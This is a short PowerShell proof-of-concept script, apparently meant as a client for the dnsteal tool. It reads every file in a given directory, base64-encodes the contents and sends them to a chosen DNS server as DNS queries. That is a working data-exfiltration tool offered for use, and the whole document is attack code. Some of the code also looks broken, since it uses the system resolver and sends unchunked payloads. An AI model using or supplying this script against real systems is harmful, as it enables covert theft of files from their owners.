<#
Powershell POC to use with => https://github.com/m57/dnsteal
#>

[CmdletBinding()]
Param(
    [Parameter(Position=0, Mandatory=$true)]
    [string]$Directory,
    [Parameter(Position=1, Mandatory=$true)]
    [string]$DNSServer
)

#Check if the DNSteal server is available
$ping = New-Object System.Net.NetworkInformation.Ping
if (($ping.Send($DNSServer)).Status -ne "Success") {
    Write-Host "The specified DNS server is not available"
    exit
}

#Scan all files in the specified directory and send their content to DNSteal server
Get-ChildItem $Directory | Foreach-Object {
    $content = Get-Content $_.FullName
    $EncodedText = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
    $req = $EncodedText + "-." + $_.Name
    
    try {
        $response = [System.Net.Dns]::GetHostAddresses($req)
        if ($response) {
            Write-Host "$($_.Name): $($response.IPAddressToString)"
        }
    }
    catch {
        Write-Host "DNS query failed for $_"
    }
}
